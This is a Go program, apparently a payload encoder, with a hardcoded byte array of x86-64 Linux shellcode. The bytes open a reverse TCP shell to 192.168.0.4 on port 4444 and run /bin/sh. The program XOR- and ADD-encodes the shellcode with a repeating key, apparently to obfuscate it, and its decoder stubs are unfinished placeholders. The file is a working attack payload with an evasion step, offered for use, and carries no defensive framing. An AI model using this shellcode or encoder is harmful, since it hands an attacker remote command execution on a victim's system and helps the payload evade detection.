package main

import (
	"fmt"
)

// TODO: Replace this for a file descriptor, read input from a binary file
var HardcodedInput = []byte{0x6a, 0x29, 0x58, 0x99, 0x6a, 0x02, 0x5f, 0x6a, 0x01,
	0x5e, 0x0f, 0x05, 0x48, 0x97, 0x48, 0xb9, 0x02, 0x00, 0x11, 0x5c, 0xc0, 0xa8,
	0x00, 0x04, 0x51, 0x48, 0x89, 0xe6, 0x6a, 0x10, 0x5a, 0x6a, 0x2a, 0x58, 0x0f,
	0x05, 0x6a, 0x03, 0x5e, 0x48, 0xff, 0xce, 0x6a, 0x21, 0x58, 0x0f, 0x05, 0x75,
	0xf6, 0x6a, 0x3b, 0x58, 0x99, 0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73,
	0x68, 0x00, 0x53, 0x48, 0x89, 0xe7, 0x52, 0x57, 0x48, 0x89, 0xe6, 0x0f, 0x05}

func main() {
	// TODO: Read file here
	fmt.Printf(">> Input:\n%x\n", HardcodedInput)

	xorEncoder := genEncoderFn(
		"XOR",
		// encoder
		func(input byte, key byte) ([]byte, error) { return []byte{input ^ key}, nil },
		// decoder
		func(input []byte) ([]byte, error) {
			return input, nil
		},
	)

	addEncoder := genEncoderFn(
		"ADD",
		// encoder
		func(input byte, key byte) ([]byte, error) { return []byte{input + key}, nil },
		// decoder
		func(input []byte) ([]byte, error) {
			return input, nil
		},
	)

	encoders := []func(input []byte, key []byte) ([]byte, error){
		xorEncoder,
		addEncoder,
	}

	key := []byte{0x50, 0x51, 0x52, 0x53, 0x54}

	for _, encode := range encoders {
		encodedOutput, err := encode(HardcodedInput, key)
		if err != nil {
			fmt.Printf("[ERROR]: An error ocurred while encoding %v\n", err)
		}
		fmt.Printf(">> Output:\n%x\n", encodedOutput)
	}

}

func genEncoderFn(
	encoderName string,
	operation func(input byte, key byte) ([]byte, error),
	addDecoderStub func(input []byte) ([]byte, error),
) func(input []byte, key []byte) ([]byte, error) {
	encoderFn := func(input []byte, key []byte) ([]byte, error) {
		fmt.Printf(">> Running %s encoder using key %x (size=%d)\n", encoderName, key, len(key))
		output := []byte{}
		for i, inputByte := range input {
			//fmt.Printf("encoding hex input[%d]: %v \n", i, bytecode)
			keyByte := key[i%len(key)] // this makes keylenght variable
			encodedOutput, err := operation(inputByte, keyByte)
			if err != nil {
				return nil, err
			}
			output = append(output, encodedOutput...)
		}

		output, err := addDecoderStub(output)
		if err != nil {
			return nil, err
		}

		return output, nil
	}
	return encoderFn
}
